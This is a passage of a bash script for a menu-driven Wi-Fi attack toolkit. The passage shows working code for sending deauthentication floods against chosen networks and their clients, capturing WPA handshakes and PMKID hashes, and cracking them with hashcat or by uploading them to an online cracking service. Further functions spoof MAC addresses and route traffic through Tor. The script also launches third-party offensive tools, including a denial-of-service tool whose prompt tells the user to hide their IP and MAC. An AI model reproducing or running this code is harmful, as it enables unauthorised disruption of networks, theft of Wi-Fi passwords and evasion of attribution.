    for idx in "${!network_rows[@]}"; do
        IFS=',' read -r bssid channel essid <<< "${network_rows[$idx]}"
        # Use a friendly placeholder for hidden SSIDs
        display_name="$essid"
        if [ -z "$display_name" ]; then
            display_name="(hidden network)"
        fi

        printf "%3d) %s\n" $((idx + 1)) "$display_name"
    done

    targetNumber=0
    while [ "$targetNumber" -lt 1 ] || [ "$targetNumber" -gt "$total_networks" ]; do
        echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
        read -p "└─────►$(tput setaf 7) " targetNumber
        [[ "$targetNumber" =~ ^[0-9]+$ ]] || targetNumber=0
    done

    IFS=',' read -r bssid channel targetName <<< "${network_rows[$((targetNumber - 1))]}"

    echo -e "\n${Green}You have selected the following network:${White}"
    echo -e "${Green}SSID:${White} ${targetName}"
    echo -e "${Green}BSSID:${White} ${bssid}"
    echo -e "${Green}Channel:${White} ${channel}"

    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo -e "${Red}Error: Invalid target details. Please try again with a valid network.${White}"
        exit 1
    fi

    sudo iwconfig "$foo" channel "$channel"

    rm generated-01.csv 2> /dev/null

    echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
}




networkselect () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done

}



# Capture connected clients for the selected BSSID
capture_clients() {
    local csv_file="client-01.csv"
    client=""
    CLIENTS=()
    local duration=15
    local cap_pid=0

    rm -f "$csv_file"
    echo "Scanning for clients on $bssid (channel $channel)... (full ${duration}s)"

    # Ensure interface is on the right channel before scanning
    sudo iwconfig "$foo" channel "$channel" >/dev/null 2>&1

    # Start capture in background with a hard cap on runtime
    sudo airodump-ng --bssid "$bssid" --channel "$channel" --output-format csv --write client "$foo" >/dev/null 2>&1 &
    cap_pid=$!

    # Enforce a full capture window to increase chance of seeing clients
    for _ in $(seq 1 "$duration"); do
        sleep 1
    done

    # Stop capture process if still running
    if ps -p "$cap_pid" >/dev/null 2>&1; then
        kill "$cap_pid" >/dev/null 2>&1
        wait "$cap_pid" 2>/dev/null
    fi

    echo "Client scan finished."

    if [ ! -f "$csv_file" ]; then
        echo -e "\e[31m[Error]\e[0m client CSV not found; proceeding without specific client."
        client=""
        return
    fi

    # Collect all associated client MACs (unique)
    while IFS= read -r mac; do
        # de-duplicate
        local seen=false
        for existing in "${CLIENTS[@]}"; do
            if [ "$existing" = "$mac" ]; then
                seen=true
                break
            fi
        done
        if [ "$seen" = false ]; then
            CLIENTS+=("$mac")
        fi
    done < <(
        awk -F',' -v bssid="$bssid" '
            {
                gsub(/^[ \t]+|[ \t]+$/, "", $1)
                gsub(/^[ \t]+|[ \t]+$/, "", $6)
                if ($1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $6 == bssid && $1 != bssid) {
                    print $1
                }
            }
        ' "$csv_file"
    )

    if [ "${#CLIENTS[@]}" -gt 0 ]; then
        echo -e "\e[32m[Clients]\e[0m Found ${#CLIENTS[@]} client(s)."
    else
        echo -e "\e[33m[Warning]\e[0m No associated clients found; falling back to broadcast deauth."
    fi
}


# Function to check if a capture contains a valid WPA handshake for the target BSSID
check_valid_handshake() {
    local cap_file=$1

    if [ ! -f "$cap_file" ]; then
        return 1
    fi

    # Use a temp wordlist with a dummy line so aircrack-ng does not error on /dev/null or empty files
    local tmp_wordlist
    tmp_wordlist=$(mktemp) || return 1
    echo "dummy" > "$tmp_wordlist"

    # Prefer aircrack-ng verification because tshark can report false positives on truncated files
    if command -v aircrack-ng >/dev/null 2>&1 && [ -n "$bssid" ]; then
        local aircrack_output

        # First try with the target BSSID
        aircrack_output=$(aircrack-ng -a2 -b "$bssid" -w "$tmp_wordlist" "$cap_file" 2>/dev/null)

        # Some builds throw "Pre-condition Failed" with -b; retry without -b if that happens
        if echo "$aircrack_output" | grep -qi "Pre-condition Failed"; then
            aircrack_output=""
        fi

        # If the BSSID run did not confirm a handshake, retry without -b to read the handshake count
        if ! echo "$aircrack_output" | grep -Eqi "1 handshake|handshake[: ]+yes|valid WPA handshake|WPA handshake|WPA \\(1 handshake\\)"; then
            aircrack_output=$(aircrack-ng -a2 -w "$tmp_wordlist" "$cap_file" 2>/dev/null)
        fi

        # Consider these as valid handshake signals
        if echo "$aircrack_output" | grep -Eqi "1 handshake|handshake[: ]+yes|valid WPA handshake|WPA handshake|WPA \\(1 handshake\\)" && \
           ! echo "$aircrack_output" | grep -Eqi "0 handshake|WPA handshake: *no"; then
            echo "Handshake verified in $cap_file (aircrack-ng)"
            rm -f "$tmp_wordlist"
            return 0
        fi
        # If a key was somehow found, also treat as valid
        if echo "$aircrack_output" | grep -qi "key found"; then
            echo "Handshake verified in $cap_file (key already found)"
            rm -f "$tmp_wordlist"
            return 0
        fi
        echo "No valid WPA handshake found in $cap_file (aircrack-ng check failed)"
        rm -f "$tmp_wordlist"
        return 1
    fi

    rm -f "$tmp_wordlist"

    # Fallback only if aircrack-ng is unavailable: require at least one EAPOL frame
    if command -v tshark >/dev/null 2>&1 && tshark -r "$cap_file" -Y "eapol" -c 1 >/dev/null 2>&1; then
        echo "EAPOL data found in $cap_file (tshark fallback)"
        return 0
    fi

    echo "No valid handshake found in $cap_file (no verifier available)"
    return 1
}

# Function to check if .cap files exist and verify EAPOL frames
check_cap_files() {
    if ! ls *.cap >/dev/null 2>&1; then
        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"
        return 1
    fi

    echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"

    for cap_file in *.cap; do
        echo -e "\nChecking $cap_file for EAPOL frames..."
        if check_valid_handshake "$cap_file"; then
            echo -e "\e[32m[Handshake Found]\e[0m Proceeding with cracking."

            echo "Turning off monitor mode..."
            stopMon
            if [ -n "$email" ]; then
                echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email" > /dev/null 2>&1
            fi

            crack "$cap_file"
            return 0
        else
            echo -e "\e[31m[Handshake Not Found]\e[0m Skipping file."
        fi
    done

    echo -e "\e[31mNo valid .cap files with handshakes found.\e[0m"
    return 1
}

deauthAttack () {
    if ! validate_target; then
        return 1
    fi

    local attempt=1
    local airodump_pid=0
    while [ "$attempt" -le "$MAX_HANDSHAKE_ATTEMPTS" ]; do
        capture_clients

        # Rotate through discovered clients across attempts
        if [ "${#CLIENTS[@]}" -gt 0 ]; then
            client="${CLIENTS[$(( (attempt - 1) % ${#CLIENTS[@]} ))]}"
            echo -e "\e[32m[Client]\e[0m Targeting client $client (attempt $attempt)"
        else
            client=""
            echo -e "\e[33m[Warning]\e[0m No clients to target; using broadcast deauth."
        fi

        echo -e "\e[33m[Attempt $attempt/$MAX_HANDSHAKE_ATTEMPTS]\e[0m Capturing handshake on $bssid (channel $channel)..."

        # Use per-attempt capture prefix to avoid overwriting
        capture_prefix="handshake_${attempt}"

        # Start capture
        sudo airodump-ng --bssid "$bssid" --channel "$channel" --output-format pcap --write "$capture_prefix" "$foo" >/dev/null 2>&1 &
        airodump_pid=$!

        # Give airodump-ng a moment to start
        sleep 5

        # Aggressive deauth bursts increase each attempt
        local deauth_count
        deauth_count=$((30 + (attempt - 1) * 30))

        # Send deauth frames; if client is known, target it, otherwise broadcast
        if [ -n "$client" ]; then
            xterm -e aireplay-ng -0 "$deauth_count" -a "$bssid" -c "$client" "$foo"
            # Follow with a broadcast burst to catch other clients
            xterm -e aireplay-ng -0 "$deauth_count" -a "$bssid" "$foo"
        else
            xterm -e aireplay-ng -0 "$deauth_count" -a "$bssid" "$foo"
        fi

        # Allow capture time after deauth
        sleep 12

        # Stop capture cleanly
        if ps -p $airodump_pid >/dev/null 2>&1; then
            kill $airodump_pid
            wait $airodump_pid 2>/dev/null
        fi

        # Give filesystem a moment to flush capture data
        sleep 3

        # Check for handshake
        if check_cap_files; then
            return 0
        fi

        echo -e "\e[33m[Retry]\e[0m Handshake not found. Retrying..."
        attempt=$((attempt + 1))
    done

    # If we reach here, attempts exhausted. If we have captures, offer to crack anyway.
    if ls *.cap >/dev/null 2>&1; then
        echo -e "\e[33m[Notice]\e[0m Captures exist but no validated handshake. Proceeding to cracking anyway."
        stopMon
        crack
        return 0
    fi

    echo -e "\e[31m[Failed]\e[0m Could not capture a valid handshake after $MAX_HANDSHAKE_ATTEMPTS attempts."
    return 1
 } 



recon() {
    retries=0
    max_retries=5  # Define the number of retries
    client_found=false  # Flag to check if client is found

    while [ $retries -lt $max_retries ]; do
        echo -e "\e[32m[Scanning for clients...]\e[0m"  # Green text for scanning message

        # Start airodump-ng with sudo for permission
        xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 60 && exit" > /dev/null 2>&1 &

        # Allow 60 seconds for the capture file to populate (increased wait time)
        echo "Waiting for 60 seconds for airodump to capture data..."
        sleep 60

        # Check if the capture CSV file exists and contains data
        if [ ! -f "client-01.csv" ]; then
            echo -e "\e[31mError: client-01.csv not found. Airodump-ng may not have captured any data.\e[0m"
            retries=$((retries + 1))
            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
            sleep 5  # Delay before retrying
            continue
        fi

        # Remove lines that match the BSSID from the client-01.csv file and save to a temporary file using awk
        echo -e "\e[32m[Filtering out BSSID from client-01.csv...]\e[0m"
        awk -F',' -v bssid="$bssid" '
        BEGIN {
            print_header = 1
        }
        {
            if (print_header) {
                print $0
                print_header = 0
            } else if ($1 != bssid && $1 != "Station MAC" && $1 != "" && length($1) == 17) {
                print $0
            }
        }' client-01.csv > client_filtered.csv

        # Extract the client MAC addresses from the filtered CSV file
        echo -e "\e[32m[Client MAC addresses found in client_filtered.csv]:\e[0m"
        
        # Read through the filtered CSV file to find client MACs
        while IFS=',' read -r station_mac first_time last_time power packet_count bssid probed_essid; do
            # Skip the header or rows with empty station_mac, and ensure it's not the BSSID
            if [[ -n "$station_mac" && "$station_mac" != "Station MAC" && "$station_mac" != "$first_time" && "$station_mac" != "$bssid" && "${#station_mac}" == 17 ]]; then
                client=$station_mac  # Correctly assign to $client
                client_found=true
                echo -e "\e[32m[Client found: $client]\e[0m"  # Green text for client found
                break
            fi
        done < <(tail -n +2 client_filtered.csv)  # Skip header row using tail

        # If client found, break out of the retry loop
        if [ "$client_found" = true ]; then
            break  # Exit the loop after client is found
        else
            retries=$((retries + 1))
            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
            sleep 5  # Delay before retrying
        fi
    done

    # If no client is found after max retries, exit with an error
    if [ "$client_found" = false ]; then
        echo -e "\e[31m[Failed to capture client after $max_retries retries. Exiting...]\e[0m"
        rm client_filtered.csv
        exit 1
    fi

    # Now handle the .cap file
    echo "Waiting for capture file to be available..."

    # Check for any .cap file in the directory (not just client-01.cap)
    for ((i=0; i<5; i++)); do
        # List files in the directory for debugging
        echo "Listing .cap files in the directory..."
        ls *.cap

        # Check if any .cap file exists
        if ls *.cap 1> /dev/null 2>&1; then
            # Move the first .cap file found
            cap_file=$(ls *.cap | head -n 1)
            sudo mv "$cap_file" client.cap
            echo -e "\e[32m[Capture file renamed to client.cap]\e[0m"
            break
        else
            echo "Capture file not found, retrying... ($((i+1))/5)"
            sleep 3  # Delay before retrying
        fi
    done

    # Check if the file was successfully renamed
    if [ -f "client.cap" ]; then
        echo -e "\e[32m[Capture file successfully renamed.]\e[0m"
    else
        echo -e "\e[31m[Error: .cap file not found after retries.]\e[0m"
        exit 1
    fi
}



############################################################################################
########PMKID###############################################################################

pmkid_all () {

# Call the function to select and set the interface into monitor mode
network
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

# Start the capture using hcxdumptool
echo "Starting capture using hcxdumptool..."

sudo hcxdumptool -i $foo -o dumpfile.pcapng --active_beacon --enable_status=15 
# Convert the capture to a format usable by hashcat
echo "Converting capture to hccapx format..."
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng

#cat essidlist
#monitor

# Crack the password using aircrack-ng and a wordlist
crackCAT


}











crackCAT () {
    echo "Do you want to crack hashes from your device or from the web?"
    select method in "Local (Device)" "Upload (WPA-Sec)"; do
        case $method in
            "Local (Device)")
                # Local cracking with Hashcat or other methods (you can extend this part)
                stopMon
                echo "You have selected local cracking."
                ensure_wordlist_dir
                local wordlist
                while true; do
                    wordlist=$(select_wordlist) && break
                    echo "Please enter a valid wordlist path."
                done
                # Crack the password using aircrack-ng and a wordlist
                echo "Attempting to crack the password..."
                local crack_output password_found ssid
                crack_output=$(mktemp)
                hashcat -m 22000 hash.hc22000 "$wordlist" --outfile "$crack_output" --outfile-format 2
                if [ -s "$crack_output" ]; then
                    password_found=$(tail -n 1 "$crack_output")
                    if [ -f essidlist ]; then
                        ssid=$(head -n 1 essidlist)
                    fi
                    if [ -z "$ssid" ] && [ -n "$targetName" ]; then
                        ssid="$targetName"
                    fi
                    if [ -z "$ssid" ]; then
                        ssid="hash.hc22000"
                    fi
                    log_cracked_password "$ssid" "$password_found"
                fi
                rm -f "$crack_output"
                exit
                ;;
            "Upload (WPA-Sec)")
                stopMon
                # Ask for the user's email for cracking (optional, based on the site)
                echo "Please provide your email for WPA-Sec service:"
                read -p "Email: " user_email

                if [[ -z "$user_email" ]]; then
                    echo "Email cannot be empty. Exiting."
                    exit 1
                fi

                # Ask for the path to the .cap file
                echo "Please provide the path to your .pcapng file:"
                echo "Your current directory:"
                pwd
                ls *.pcapng
                read -p "Path to .pcapng file: " capture_file

                # Check if the file exists
                if [[ ! -f "$capture_file" ]]; then
                    echo "File not found. Exiting."
                    exit 1
                fi

                # Ensure user agrees to terms and conditions (optional, based on the site)
                echo "Please agree to the Terms & Conditions by typing 'yes':"
                read agreement

                if [[ "$agreement" != "yes" ]]; then
                    echo "You must agree to the terms to continue. Exiting."
                    exit 1
                fi

                # Read the key from key.txt
                if [[ ! -f "key.txt" ]]; then
                    echo "key.txt file not found. Exiting."
                    exit 1
                fi

                # Get the key from key.txt
                key=$(cat key.txt)

                # Check if the key is empty
                if [[ -z "$key" ]]; then
                    echo "Key in key.txt is empty. Exiting."
                    exit 1
                fi

                # Upload to WPA-Sec
                echo "Uploading $capture_file to WPA-Sec..."
                response=$(curl -s -w "%{http_code}" -X POST "https://wpa-sec.stanev.org/?submit" \
                    -F "email=$user_email" \
                    -F "file=@$capture_file" \
                    -F "key=$key" \
                    -F "submit=Submit")

                # Output the response status code and body for debugging
                echo "Response: $response" 
                echo "This capture is legacy but will still work..."
                echo "Handshakes have been successfully submitted. If a password is found you will receive an email."

                # Check the response to determine if submission was successful
                if [[ "$response" == *"Cracking started"* ]]; then
                    echo "Cracking request submitted successfully."
                else
                    echo "Error submitting your request. Please try again. Response: $response"
                    exit 1
                fi
                break
                ;;
            *)
                echo "Invalid option. Please select either 'Local' or 'Upload'."
                ;;
        esac
    done



}





############################################################################################
macChange() {
     ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Restore Original MAC Address"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Show Current MAC Address"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Changing MAC Address..."
     spoofMAC
     return
     ;;
  2) echo -e "\n[${Green}Selected${White}] Restore MAC Address.."
     RestoreMAC
     return
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Current MAC Address.."
     showMAC
     return
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Going back.."
     return
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


spoofMAC(){
networkselect
macchanger -s $foo
sudo ifconfig $foo down
sudo macchanger -r $foo
sudo ifconfig $foo up
macchanger -s $foo
menu
}

RestoreMAC(){
networkselect
sudo ifconfig $foo down
sudo macchanger -p $foo
sudo ifconfig $foo up
sudo macchanger -s $foo
menu
}

showMAC() {
networkselect
macchanger -s $foo
macChange


}





anonsurf (){ 
       ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Start Anonsurf"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Show Anonsurf Status"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Stop Anonsurf"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Restart Anonsurf"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change TOR Identity"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Start i2p Services"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Stop i2p Services"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Show Current IP Address"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Start Anonsurf"
     anonsurfStart
     return
     ;;
  2) echo -e "\n[${Green}Selected${White}] Show Anonsurf Status"
     anonsurfStatus
     return
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Stop Anonsurf"
     anonsurfStop
     return
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Restart Anonsurf"
     anonsurfRestart
     return
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Changeing Identity Restarting TOR"
     anonsurfChange
     return
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Start i2p Services"
     anonsurfStarti2p
     return
     ;; 
  7) echo -e "\n[${Green}Selected${White}] Stop i2p Services"
     anonsurfStopi2p
     return
     ;; 
  8) echo -e "\n[${Green}Selected${White}] Show your current IP address"
     anonip
     return
     ;; 
  9) echo -e "\n[${Green}Selected${White}] Going back.."
     return
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


anonsurfStart(){
sudo anonsurf start
}

anonsurfStatus(){
sudo anonsurf status
}


anonsurfStop(){
sudo anonsurf stop
}

anonsurfRestart(){
sudo anonsurf restart
}

anonsurfChange(){
sudo anonsurf change
}

anonsurfStarti2p(){
sudo anonsurf starti2p
}
anonsurfStopi2p(){
sudo anonsurf stopi2p
}

anonip(){
sudo anonsurf myip
}





      tools () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Routersploit"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Zatacker"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Morpheus"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Cupp"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Dracnmap"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}KickThemOut"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Ghost-Phisher"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Xerxes"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Websploit"
echo -e "      ${Red}[${Blue}10${Red}] ${Green}Angry IP Scanner"
echo -e "      ${Red}[${Blue}11${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Routersploit"
  routersploit
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Zatacker"
  Zatacker
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Morpheus"
  morpheus
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Cupp"
  Cupp
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Dracnmap"
  dracnmap
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 KickThemOut"
  kickthemout
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Ghost-Phisher"
  ghostPhisher
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Xerxes"
  Xerxes
     ;;
  9) echo -e "\n[${Green}Selected${White}] Option 9 Websploit"
  websploit
     ;;
  10) echo -e "\n[${Green}Selected${White}] Option 10 Angry IP Scanner"
  AngryIpScanner
     ;;
  11) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


zirikatu () {
enter_tool_dir "$TOOLS_DIR/zirikatu" || return
sudo ./zirikatu.sh

}

routersploit () {
enter_tool_dir "$TOOLS_DIR/routersploit" || return
python3 rsf.py

}

Zatacker () {
enter_tool_dir "$TOOLS_DIR/Zatacker" || return
./ZT.sh
}

morpheus () {
enter_tool_dir "$TOOLS_DIR/morpheus" || return
sudo ./morpheus.sh
}

Hakku () {
enter_tool_dir "$TOOLS_DIR/hakkuframework" || return
./hakku

}

Trity () {
trity

}

Cupp () {
enter_tool_dir "$TOOLS_DIR/cupp" || return
python3 cupp.py -i
}

dracnmap () {
enter_tool_dir "$TOOLS_DIR/Dracnmap" || return
chmod +x dracnmap-v2.2.sh
sudo ./dracnmap-v2.2.sh

}

kickthemout () {
enter_tool_dir "$TOOLS_DIR/kickthemout" || return
sudo python3 kickthemout.py

}


ghostPhisher () {
enter_tool_dir "$TOOLS_DIR/ghost-phisher/Ghost-Phisher" || return
chmod +x ghost.py
sudo ./ghost.py
}


Xerxes () {
enter_tool_dir "$TOOLS_DIR/XERXES" || return
echo "Xerxes DoS Attack"
sleep 3
echo "Remember to hide your IP and MAC"
sleep 3
read -p "Enter the IP & Port of target (e.g. 102.102.102.102:80) : " ip
sudo ./xerxes $ip

}


Katana () {
enter_tool_dir "$TOOLS_DIR/KatanaFramework" || return
sudo ./ktf.run
sudo ./ktf.run -h
echo -e "\n[${Green}Selected${White}] Going back.."
     return
  
}

websploit () {
sudo websploit
}



BeeLogger () {
enter_tool_dir "$TOOLS_DIR/BeeLogger" || return
sudo python bee.py
}


ezsploit () {
enter_tool_dir "$TOOLS_DIR/ezsploit" || return
sudo ./ezploit.sh


}

TheFatRat () {
sudo fatrat

}

AngryIpScanner () {
sudo sh /usr/bin/ipscan
}


Sn1per () {
enter_tool_dir "$TOOLS_DIR/Sn1per" || return
sudo sniper

}


redhawk () {
enter_tool_dir "$TOOLS_DIR/RED_HAWK" || return
php rhawk.php

}

Help()
{        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}How to set up ad hoc network on my Pi?"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}My tool(s) are not working :("
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Turn off monitor mode"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Uninstall"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Clean"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] How to set up ad hoc network?"
     instructions
     return
     ;;
  2) echo -e "\n[${Green}Selected${White}] Fix this shit.."
     fix
     return
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Fixing monitor mode.."
     stopMon
     return
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Running uninstall tool.."
    uninstall
     return
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Cleaning captured handshakes.."
    clean
     return
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Going back.."
     return
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


clean () {
sudo rm -r ipscan_3.7.6_all.deb > /dev/null 2>&1
cleanup
}

uninstall () {

run_script_if_exists "uninstall.sh"

}

stopMon () {
  if command -v airmon-ng >/dev/null 2>&1; then
    if [ -n "$monitor_interface" ]; then
      sudo airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    fi
    if [ -n "$base_interface" ]; then
      sudo airmon-ng stop "$base_interface" > /dev/null 2>&1
    fi
  fi
  sudo systemctl start NetworkManager > /dev/null 2>&1
  sudo systemctl start wpa_supplicant > /dev/null 2>&1
  echo -e "\e[32mmonitor mode disabled.\e[0m"
  monitor_interface=""
  base_interface=""
}




instructions(){

echo " I know you are a lazy noob, this will do it for you:"
echo " https://github.com/B3ND1X/nm4n00bz"

}






# Function to check if the script exists and run it
run_script_if_exists() {
    local script_name=$1
    if [ -f "$SCRIPT_DIR/$script_name" ]; then
        echo "$(tput setaf 2)Running $script_name..."
        bash "$SCRIPT_DIR/$script_name"
    else
        echo "$(tput setaf 1)$script_name not found!"
    fi
}

fix() {
# Menu logic
echo "Running install tool..."
run_script_if_exists "install.sh"
run_script_if_exists "setup_postfix.sh"
}








log(){
cat "$SCRIPT_DIR/besside.log"
}

spinner() {        ##### Animation while scanning for available networks #####
sleep 2
echo -e "[${Green}$foo${White}] Preparing for scan..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}$foo${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
done
}

cleanup_in_progress=false

# Define a function to handle interruptions
interrupt_handler() {
    # Avoid re-entrancy if multiple signals arrive
    if [ "$cleanup_in_progress" = true ]; then
        return
    fi
    cleanup_in_progress=true

    # Stop handling further interrupts during cleanup
    trap - SIGINT SIGTERM

    echo "Script interrupted! Cleaning up..."
    stopMon
    cleanup
    exit 130
}

# Set up the trap for SIGINT (Ctrl+C) and SIGTERM (kill command)
trap interrupt_handler SIGINT SIGTERM

# Simulate long-running task
#echo "Script is running... Press Ctrl+C to interrupt."
#while true; do
#    sleep 1
#done




targeted () {
checkDependencies
#checkWiFiStatus
banner
menu
}

targeted
